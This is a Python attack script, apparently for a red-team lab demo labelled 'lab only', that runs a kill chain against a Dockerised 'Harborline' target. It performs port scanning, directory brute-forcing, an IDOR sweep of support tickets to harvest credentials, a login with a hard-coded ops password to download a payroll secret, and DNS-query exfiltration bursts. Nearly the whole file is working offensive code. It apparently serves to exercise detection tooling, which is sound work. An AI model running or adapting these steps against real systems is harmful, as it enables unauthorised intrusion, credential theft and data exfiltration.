#!/usr/bin/env python3
"""Harborline kill-chain helper (lab only).

Recon must run *inside* the docker network so a multi-port scan hits the
target. From the Windows host this script docker-execs into redteam.

  python scripts/demo_killchain.py --phase recon     # scan (forecast should rise)
  python scripts/demo_killchain.py --phase enum      # dir bust
  python scripts/demo_killchain.py --phase spray     # guest login + ticket IDOR
  python scripts/demo_killchain.py --phase loot      # ops login + payroll download
  python scripts/demo_killchain.py --phase all
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

SCAN_PORTS = [21, 22, 53, 80, 443, 3306, 5432, 6379, 8080, 8443, 9090, 9200, 27017]
ENUM_PATHS = [
    "/", "/robots.txt", "/careers", "/status", "/search", "/login", "/register",
    "/tickets", "/internal/runbook", "/files/jobs", "/admin", "/api/health",
    "/backup", "/.git", "/phpinfo.php", "/server-status",
]
OPS_USER = "ops.monitor"
OPS_PW = "Harborline!4412"
PAYROLL_MARK = "PAYROLL_SECRET="


def web_base(inside: bool) -> str:
    return "http://target-server" if inside else "http://127.0.0.1:8080"


def scan_host() -> str:
    return "target-server"


def probe(host: str, port: int, timeout: float = 0.4) -> bool:
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def phase_recon(*, rounds: int = 5) -> None:
    host = scan_host()
    print(f"recon scan {host} ports={SCAN_PORTS} rounds={rounds}")
    t0 = time.time()
    open_ports: set[int] = set()
    for r in range(rounds):
        for p in SCAN_PORTS:
            if probe(host, p):
                open_ports.add(p)
        print(f"  round {r+1}/{rounds} open={sorted(open_ports)}")
        time.sleep(3.0)
    print(f"recon done in {time.time()-t0:.1f}s open={sorted(open_ports)}")


def http_get(url: str, opener: urllib.request.OpenerDirector, timeout: float = 6.0) -> tuple[int, str]:
    try:
        with opener.open(url, timeout=timeout) as r:
            body = r.read().decode("utf-8", "replace")
            return int(r.status), body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return int(exc.code), body
    except Exception as exc:
        return 0, str(exc)


def http_post(url: str, data: dict[str, str], opener: urllib.request.OpenerDirector) -> tuple[int, str]:
    raw = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=raw, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(req, timeout=8) as r:
            return int(r.status), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return int(exc.code), body
    except Exception as exc:
        return 0, str(exc)


def phase_enum(base: str) -> None:
    opener = urllib.request.build_opener()
    print(f"enum against {base}")
    for path in ENUM_PATHS * 3:
        code, _ = http_get(base + path, opener)
        print(f"  {code} {path}")
        time.sleep(0.15)
    print("enum done")


def phase_spray(base: str) -> None:
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    guest = f"guest{int(time.time()) % 100000}"
    print(f"spray/IDOR as {guest}")
    http_post(base + "/register", {"username": guest, "password": "demo-guest-1"}, opener)
    http_post(base + "/login", {"username": guest, "password": "demo-guest-1"}, opener)
    found = None
    for tid in list(range(1, 40)) + [4412]:
        code, body = http_get(f"{base}/tickets/{tid}", opener)
        hit = OPS_USER in body or "Harborline!" in body
        print(f"  ticket {tid} -> {code} {'OPS CREDS' if hit else ''}")
        if hit:
            found = tid
            break
        time.sleep(0.05)
    print(f"spray done found_ticket={found}")


def phase_loot(base: str) -> None:
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    print("loot as ops.monitor")
    http_post(base + "/login", {"username": OPS_USER, "password": OPS_PW}, opener)
    code, body = http_get(base + "/files/jobs", opener)
    print(f"  jobs {code} bytes={len(body)}")
    marker = "/files/jobs/"
    job = None
    if marker in body:
        start = body.index(marker) + len(marker)
        job = body[start:].split("/")[0].split("<")[0].strip()
    if not job:
        print("  no job id — ops login probably failed")
        return
    url = f"{base}/files/jobs/{job}/artifact"
    print(f"  downloading {url}")
    code, body = http_get(url, opener, timeout=20)
    ok = PAYROLL_MARK in body
    print(f"  artifact {code} steal={'YES ' + PAYROLL_MARK if ok else 'NO'} bytes={len(body)}")


def phase_exfil(inside: bool) -> None:
    host = scan_host() if inside else "127.0.0.1"
    print(f"dns exfil toward {host}:53")
    payload = "payroll.secret.exfil.harborline.lab"
    for i in range(40):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.4)
        try:
            q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            for lab in payload.split("."):
                q += bytes([len(lab)]) + lab.encode()
            q += b"\x00\x00\x10\x00\x01"
            sock.sendto(q, (host, 53))
            sock.recv(512)
        except OSError:
            pass
        finally:
            sock.close()
        time.sleep(0.2)
    print("exfil burst done")


def exec_recon_on_labnet() -> int:
    cmd = [
        "docker", "exec", "attacker-bot",
        "python3", "/app/scripts/demo_killchain.py",
        "--phase", "recon", "--inside",
    ]
    print("running recon inside attacker-bot (docker network)...")
    return subprocess.call(cmd)


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--phase", choices=["recon", "enum", "spray", "loot", "exfil", "all"], default="all")
    p.add_argument("--inside", action="store_true", help="already on prism-lab (redteam container)")
    args = p.parse_args()
    inside = args.inside or os.environ.get("HOSTNAME") == "redteam"
    base = web_base(inside)

    if args.phase == "recon" and not inside:
        return exec_recon_on_labnet()
    if args.phase in ("exfil", "all") and args.phase == "exfil" and not inside:
        cmd = ["docker", "exec", "attacker-bot", "python3", "/app/scripts/demo_killchain.py", "--phase", "exfil", "--inside"]
        return subprocess.call(cmd)

    if args.phase in ("recon", "all"):
        if not inside:
            rc = exec_recon_on_labnet()
            if rc != 0:
                return rc
        else:
            phase_recon()
    if args.phase in ("enum", "all"):
        phase_enum(base)
    if args.phase in ("spray", "all"):
        phase_spray(base)
    if args.phase in ("loot", "all"):
        phase_loot(base)
    if args.phase in ("exfil", "all"):
        if inside:
            phase_exfil(inside=True)
        else:
            subprocess.call(["docker", "exec", "attacker-bot", "python3", "/app/scripts/demo_killchain.py", "--phase", "exfil", "--inside"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
